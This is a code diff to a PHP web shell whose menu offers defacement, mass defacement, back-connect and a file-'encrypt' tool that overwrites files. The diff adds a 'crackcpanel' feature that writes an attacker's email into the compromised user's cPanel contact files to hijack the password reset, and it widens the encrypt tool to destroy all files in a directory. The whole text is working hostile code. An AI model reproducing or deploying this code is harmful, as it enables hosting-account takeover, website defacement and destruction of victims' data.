@@ -333,6 +333,7 @@ echo "
 <a href='$file?path=$path&tool=deface' class='w3-button w3-indigo w3-small w3-round'>Single Deface</a>
 <a href='$file?path=$path&tool=massdef' class='w3-button w3-indigo w3-small w3-round'>Mass Deface</a>
 <a href='?tool=testmail' class='w3-button w3-indigo  w3-small w3-round'>Test Mail</a>
+<a href='?tool=crackcpanel' class='w3-button w3-indigo  w3-small w3-round'>Cpanel</a>
 <a href='?tool=backconnect' class='w3-button w3-indigo w3-small w3-round'>Back Connect</a>
 <a href='?tool=about' class='w3-button w3-indigo w3-small w3-round'>About</a>
 <a href='?logout' class='w3-button w3-indigo w3-small w3-round'>Log Out</a>
@@ -347,7 +348,7 @@ function encrypt($def,$locdir){
     
       if(isset($_POST['encrypt'])){
       if(!empty($def)){ 
-       $fileList = glob("$locdir/.*");
+       $fileList = glob("$locdir/*.*");
        foreach($fileList as $file){
        $x = file_get_contents($file);
        $o = base64_encode($x);
@@ -380,11 +381,38 @@ ErrorDocument 404 /indx.php");
 
 /* IF/ELSE MENU */
   
-if($_GET['tool'] == "zoneh"){
-
+if($_GET['tool'] == "crackcpanel"){
+   echo "<form method='POST'>";
+   echo "<font>ENTER EMAIL (cpanel reset password)</font><br><br>";
+   echo "<input style='background:black;color:lime;border:2px solid white;outline:none;width:230px;' type='email' name='cemail' placeholder='email'><br><br>";
+   echo "<input type='submit' value='crack' name='crackcpnel'>";
+   echo "</form>";
+   
+   $user = get_current_user();
+   $site = $_SERVER['HTTP_HOST'];
+   $ips = getenv('REMOTE_ADDR');
+   
+   if(isset($_POST['crackcpnel'])){ 
+       $myemail = $_POST['cemail'];
+       
+       $wr = 'email:'.$myemail;
+       /* CREATE FILE IN .CPANEL */
+       $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
+       fwrite($f, $wr); 
+       fclose($f);
+       /* CREATE FILE IN HOME */
+       $f = fopen('/home/'.$user.'/.contactinfo', 'w');
+       fwrite($f, $wr); 
+       fclose($f);
+       $parm = 'http://'.$site.':2082/resetpass?start=1';
+       echo "<font>RESET LINK [</font> <font color='white'><a target='_blank' href='$parm'>$parm</a></font> <font>]</font><br>";
+       echo "<br><font>Done</font>";
+   }
+   
+   
 } else if($_GET['tool'] == "encrypt"){
     
-    echo "<br><Br>";
+    echo "<br><br>";
     echo '<font>Warning! All data here will be destroy.</font><br><br>';
     echo '<form method="POST"><br>
     <font>File Located</font><br>
